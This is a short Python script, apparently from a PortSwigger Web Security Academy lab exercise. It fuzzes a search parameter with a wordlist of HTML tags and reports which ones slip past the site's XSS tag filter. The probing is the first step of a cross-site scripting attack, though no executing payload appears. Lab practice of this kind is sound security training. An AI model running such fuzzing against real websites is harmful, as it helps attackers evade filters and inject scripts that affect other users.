import requests

url = 'https://acd51f851e81adb380b59fd700010089.web-security-academy.net/?search='

f = open('wordlists/xss-tags.txt', 'r')
for x in f:
    response = requests.get(url + '<' + x + '>')
    if('Tag is not allowed' not in response.text):
        print(x, end='')
